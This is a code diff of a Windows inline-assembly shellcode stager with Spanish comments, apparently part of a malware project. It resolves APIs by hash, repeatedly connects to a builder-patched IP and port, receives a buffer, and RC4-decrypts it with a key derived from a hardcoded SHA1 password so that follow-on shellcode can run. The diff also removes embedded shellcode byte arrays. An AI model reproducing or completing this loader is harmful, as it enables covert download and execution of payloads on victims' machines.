@@ -20,28 +20,25 @@ void gtfo();
 
 /*Se declaran las constantes con el formato "_%NombreAPI%" el valor es la posición de la dirección del API en el stack*/
 CREATE_IDS(
-			/*kernel32*/	(LoadLibraryA) (ExitProcess) (VirtualAlloc) (VirtualFree)
+			/*kernel32*/	(LoadLibraryA) (ExitProcess) (GlobalAlloc) (GlobalFree)
 			/*ws2_32*/		(WSASocketA) (connect) (WSAStartup) (closesocket) (send) (inet_addr) (gethostbyname) (recv)
-			/*advapi32*/	(CryptAcquireContextA) (CryptCreateHash) (CryptHashData) (CryptDeriveKey) (CryptEncrypt)
-			/*variables*/	(hSocket) (Delta)
+			/*advapi32*/	(CryptAcquireContextA) (CryptCreateHash) (CryptHashData) (CryptDeriveKey) (CryptDecrypt)
+			/*variables*/	(hSocket) (Delta) (pBuff) (buffLen) (hProv) (hHash) (hKey)
 		   )
 
 void __declspec(naked) main(){
 	__asm{
 		jmp  start
-		//SHELLCODE IAT de Ark
-		//EMIT_BYTE_ARRAY((0x55)(0x89)(0xE5)(0x60)(0xE8)(0x00)(0x00)(0x00)(0x00)(0x5E)(0x81)(0xEE)(0x09)(0x10)(0x40)(0x00)(0x8B)(0x55)(0x08)(0x8B)(0x5A)(0x0C)(0x89)(0x9E)(0x62)(0x11)(0x40)(0x00)(0x8B)(0x5A)(0x10)(0x89)(0x9E)(0x6E)(0x11)(0x40)(0x00)(0x8B)(0x5A)(0x14)(0x89)(0x9E)(0x68)(0x11)(0x40)(0x00)(0xFF)(0x32)(0xE8)(0x1E)(0x00)(0x00)(0x00)(0x50)(0xFF)(0x32)(0xE8)(0x58)(0x00)(0x00)(0x00)(0x8B)(0x5A)(0x04)(0x21)(0xDB)(0x75)(0x03)(0x8B)(0x58)(0x28)(0x03)(0x1A)(0xFF)(0x72)(0x08)(0xFF)(0xD3)(0x61)(0xC9)(0xC2)(0x04)(0x00)(0x55)(0x89)(0xE5)(0x52)(0x57)(0x8B)(0x55)(0x08)(0x66)(0x81)(0x3A)(0x4D)(0x5A)(0x75)(0x12)(0x8B)(0x42)(0x3C)(0x8D)(0x3C)(0x10)(0x81)(0x3F)(0x50)(0x45)(0x00)(0x00)(0x75)(0x04)(0x89)(0xF8)(0xEB)(0x02)(0x31)(0xC0)(0x5F)(0x5A)(0xC9)(0xC2)(0x04)(0x00)(0x55)(0x89)(0xE5)(0x53)(0x8B)(0x45)(0x0C)(0x8B)(0x5D)(0x10)(0xC1)(0xE3)(0x03)(0x8B)(0x44)(0x18)(0x78)(0x03)(0x45)(0x08)(0x5B)(0xC9)(0xC2)(0x0C)(0x00)(0x55)(0x89)(0xE5)(0x83)(0xEC)(0x14)(0x60)(0x6A)(0x01))
-		//EMIT_BYTE_ARRAY((0xFF)(0x75)(0x0C)(0xFF)(0x75)(0x08)(0xE8)(0xD3)(0xFF)(0xFF)(0xFF)(0x89)(0x45)(0xF4)(0x89)(0xC3)(0x8B)(0x43)(0x0C)(0x85)(0xC0)(0x0F)(0x84)(0xA3)(0x00)(0x00)(0x00)(0x03)(0x45)(0x08)(0x50)(0x89)(0x55)(0xFC)(0x89)(0x4D)(0xF8)(0xE8)(0x99)(0x00)(0x00)(0x00)(0x8B)(0x55)(0xFC)(0x8B)(0x4D)(0xF8)(0x89)(0xC2)(0x8B)(0x33)(0x8B)(0x7B)(0x10)(0x03)(0x75)(0x08)(0x03)(0x7D)(0x08)(0x8D)(0x45)(0xF0)(0x50)(0x6A)(0x04)(0x68)(0x00)(0x10)(0x00)(0x00)(0x57)(0x89)(0x55)(0xFC)(0x89)(0x4D)(0xF8)(0xE8)(0x75)(0x00)(0x00)(0x00)(0x8B)(0x55)(0xFC)(0x8B)(0x4D)(0xF8)(0x31)(0xC9)(0xF7)(0x04)(0x0E)(0xFF)(0xFF)(0xFF)(0xFF)(0x74)(0x32)(0x8B)(0x04)(0x0E)(0xA9)(0x00)(0x00)(0x00)(0x80)(0x75)(0x08)(0x03)(0x45)(0x08)(0x8D)(0x40)(0x02)(0xEB)(0x05)(0x25)(0xFF)(0xFF)(0xFF)(0x7F)(0x50)(0x52)(0x89)(0x55)(0xFC)(0x89)(0x4D)(0xF8)(0xE8)(0x46)(0x00)(0x00)(0x00)(0x8B)(0x55)(0xFC)(0x8B)(0x4D)(0xF8)(0x89)(0x04)(0x0F)(0x83)(0xC1)(0x04)(0xEB)(0xC5)(0x8D)(0x45)(0xF0)(0x50)(0xFF)(0x30)(0x68)(0x00)(0x10)(0x00)(0x00)(0x8B)(0x03)(0x57)(0x89)(0x55)(0xFC)(0x89)(0x4D)(0xF8)(0xE8)(0x19)(0x00)(0x00)(0x00)(0x8B)(0x55)(0xFC)(0x8B)(0x4D)(0xF8)(0x8D)(0x5B)(0x14)(0xE9)(0x52)(0xFF)(0xFF)(0xFF)(0x61)(0xC9)(0xC2)(0x08)(0x00)(0x68)(0x00)(0x00)(0x00)(0x00)(0xC3)(0x68)(0x00)(0x00)(0x00)(0x00)(0xC3)(0x68)(0x00)(0x00)(0x00)(0x00)(0xC3))
 IP:		EMIT_BYTE_ARRAY(('1') ('2') ('7') ('.') ('0') ('.') ('0') ('.') ('1')(0))
-PORT:	EMIT_DWORD(0xD0070002)
-//HASH:	EMIT_BYTE_ARRAY()
+		//SHA1("karcrack:1234") = "5e5dc9ad5bc908f644797d39e86708209e15b641"
+HASH:	EMIT_BYTE_ARRAY(('5') ('e') ('5') ('d') ('c') ('9') ('a') ('d') ('5') ('b') ('c') ('9') ('0') ('8') ('f') ('6') ('4') ('4') ('7') ('9') ('7') ('d') ('3') ('9') ('e') ('8') ('6') ('7') ('0') ('8') ('2') ('0') ('9') ('e') ('1') ('5') ('b') ('6') ('4') ('1'))
 		kernel32_symbol_hashes:
 		
 		#define kernel32_count	4
 		/*LoadLibraryA*/		HASH_AND_EMIT(('L') ('o') ('a') ('d') ('L') ('i') ('b') ('r') ('a') ('r') ('y') ('A'))
 		/*ExitProcess*/			HASH_AND_EMIT(('E') ('x') ('i') ('t') ('P') ('r') ('o') ('c') ('e') ('s') ('s'))
-		/*VirtualAlloc*/		HASH_AND_EMIT(('V') ('i') ('r') ('t') ('u') ('a') ('l') ('A') ('l') ('l') ('o') ('c'))
-		/*VirtualFree*/			HASH_AND_EMIT(('V') ('i') ('r') ('t') ('u') ('a') ('l') ('F') ('r') ('e') ('e'))
+		/*GlobalAlloc*/			HASH_AND_EMIT(('G') ('l') ('o') ('b') ('a') ('l') ('A') ('l') ('l') ('o') ('c'))
+		/*GlobalFree*/			HASH_AND_EMIT(('G') ('l') ('o') ('b') ('a') ('l') ('F') ('r') ('e') ('e'))
 
 		ws2_32_symbol_hashes:
 
@@ -62,7 +59,7 @@ PORT:	EMIT_DWORD(0xD0070002)
 		/*CryptCreateHash*/		HASH_AND_EMIT( ('C') ('r') ('y') ('p') ('t') ('C') ('r') ('e') ('a') ('t') ('e') ('H') ('a') ('s') ('h') )
 		/*CryptHashData*/		HASH_AND_EMIT( ('C') ('r') ('y') ('p') ('t') ('H') ('a') ('s') ('h') ('D') ('a') ('t') ('a') )
 		/*CryptDeriveKey*/		HASH_AND_EMIT( ('C') ('r') ('y') ('p') ('t') ('D') ('e') ('r') ('i') ('v') ('e') ('K') ('e') ('y') )
-		/*CryptEncrypt*/		HASH_AND_EMIT( ('C') ('r') ('y') ('p') ('t') ('E') ('n') ('c') ('r') ('y') ('p') ('t') )
+		/*CryptDecrypt*/		HASH_AND_EMIT( ('C') ('r') ('y') ('p') ('t') ('D') ('e') ('c') ('r') ('y') ('p') ('t') )
 
 start:
 		//Reservamos espacio en la pila para las direcciones de las apis
@@ -152,7 +149,7 @@ newSocket:
 		call [ebp+_WSASocketA]			//call WSASocketA
 		mov  [ebp+_hSocket], eax		//hSocket = EAX
 
-		pushr(IP)
+		pushr(IP)						//push &IP
 		call [ebp+_gethostbyname]		//call gethostbyname
 		test eax, eax
 		jne  NoErr						//Si fallamos al obtener el host mejor salimos...
@@ -163,9 +160,8 @@ NoErr:	add  eax, 0x20					//EAX = hostent.h_name
 		call [ebp+_inet_addr]			//call inet_addr
 		//Construimos la sockaddr_in en la pila
 		push eax						//push IP
-		pushr(PORT)						//push PORT
-		pop  eax
-		push [eax]
+		#define PORT 0xD0070002
+		push PORT						//push PORT					(EL BUILDER PARCHEARÁ ESTO!!!! :D)
 		mov  ebx, esp					//EBX = &sockaddr_in
 BucleConectar:
 		push 0x10						//push size(sockaddr_in)
@@ -175,6 +171,72 @@ BucleConectar:
 		test eax, eax
 		jl   BucleConectar
 		add  esp, 0x8					//Reparamos la pila
+recibir:
+		push 0x1000						//push 0x1000
+		push GPTR						//push GPTR
+		call [ebp+_GlobalAlloc]			//call GlobalAlloc
+		mov  [ebp+_pBuff], eax			//pBuffer = EAX
+
+		push 0x1000						//Tamaño Buffer
+		push eax						//Puntero Buffer
+		push [ebp+_hSocket]				//hSocket
+		call [ebp+_recv]				//call recv
+		test eax, eax
+		jle  KillSocket					//Se desconectó el socket, lo borramos y volvemos a conectar
+
+init_crypt:
+		cdq								//EDX = 0
+		push CRYPT_VERIFYCONTEXT		//push CRYPT_VERIFYCONTEXT
+		push PROV_RSA_FULL				//push PROV_RSA_FULL
+		push edx						//push NULL
+		push edx						//push NULL
+		push ebp						//
+		add  [esp], _hProv				//push &hProv
+		call [ebp+_CryptAcquireContextA]//call CryptAcquireContextA
+
+		cdq								//EDX = 0
+		push ebp						//
+		add  [esp], _hHash				//push &hHash
+		push edx						//push 0
+		push edx						//push 0
+		push CALG_SHA1					//push CALG_SHA1
+		push [ebp+_hProv]				//push hProv
+		call [ebp+_CryptCreateHash]		//call CryptCreateHash
+
+		cdq								//EDX = 0
+		push edx						//push 0
+		push 0x20						//push size(HASH)
+		pushr(HASH)						//push &HASH
+		push [ebp+_hHash]				//push hHash
+		call [ebp+_CryptHashData]		//call CryptHashData
+		
+		push ebp						//
+		add  [esp], _hKey				//push &hKey
+		push 0x00800000					//push KEYLENGHT
+		push [ebp+_hHash]				//push hHash
+		push CALG_RC4					//push CALG_RC4
+		push [ebp+_hProv]				//push hProv
+		call [ebp+_CryptDeriveKey]		//call CryptDeriveKey
+
+		cdq								//EDX = 0
+		mov  DWORD PTR DS:[ebp+_buffLen],0x1000		//buffLen = 0x1000
+		push ebp						//
+		add  [esp], _buffLen			//push &buffLen
+		push [ebp+_pBuff]				//push &pBuff
+		push edx						//push 0
+		push TRUE						//push TRUE
+		push edx						//push 0
+		push [ebp+_hKey]				//push hKey
+		call [ebp+_CryptDecrypt]		//call CryptDecrypt
+
+//proc main,LoadLibrary_,GetProcAddress_,hConexion,pHash (ENTRADA DE LA SHELLCODE DE Ark)
+		jmp  salida						//Se acabo
+KillSocket:
+		push [ebp+_pBuff]
+		call VirtualFree				//Liberamos el buffer
+		push [ebp+_hSocket]
+		call [ebp+_closesocket]			//Eliminamos el socket
+		jmp  newSocket
 salida:
 		push ERR_NO
 		call gtfo
@@ -192,7 +254,7 @@ DWORD __declspec(naked) LoadFunctions(DWORD BaseAddress, DWORD lpHashes, DWORD n
 		cdq								//EDX = 0
 NextFunction:
 		xor  eax, eax					//EAX = 0
-		lodsw							//mov ax, WWORD[esi]; esi+=2
+		lodsw							//mov ax, WORD[esi]; esi+=2
 		push eax						//FunctionHash
 		push ebx						//BaseAddress
 		call FindFunction
